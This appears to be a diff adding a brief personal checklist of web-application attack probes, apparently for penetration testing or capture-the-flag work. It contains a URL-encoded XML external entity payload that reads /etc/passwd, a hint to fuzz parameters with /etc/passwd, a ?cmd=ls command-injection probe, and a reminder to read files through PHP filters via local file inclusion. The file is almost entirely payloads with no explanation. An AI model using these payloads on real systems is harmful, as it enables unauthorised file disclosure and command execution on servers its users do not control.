@@ -1,0 +1,11 @@
+try xml payload
+
+```
+<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'file%3a///etc/passwd'>]><root><user>%26test%3b</user></root>
+
+anything with aa=ss&ass=3rf  hcek for FUZZ=/etc/passwd
+
+any php file check foor command injection ?cmd=ls
+
+check for php filters and read files via lfi
+```
